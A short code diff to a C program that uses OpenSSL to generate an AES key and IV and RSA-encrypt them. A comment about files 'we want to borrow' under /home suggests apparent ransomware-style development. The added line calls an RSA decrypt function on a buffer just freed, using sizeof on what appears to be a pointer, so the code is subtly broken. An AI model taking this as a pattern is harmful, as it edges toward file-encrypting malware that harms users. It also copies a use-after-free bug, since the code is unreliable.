@@ -29,7 +29,7 @@ int main(){
 
     OpenSSL_add_all_algorithms();
     ERR_load_crypto_strings();
-
+    
     //Generate AES key and IV
     unsigned char key[32];
     size_t key_size = sizeof(key);
@@ -60,6 +60,7 @@ int main(){
 
     OPENSSL_free(encrypted_aes_key);
     OPENSSL_free(encrypted_iv);
+    decrpyt_RSA("key/private_key.pem", encrypted_iv, sizeof(encrypted_iv));
     //List all the files we want to borrow ;)
     /*
     const char *path = "/home";
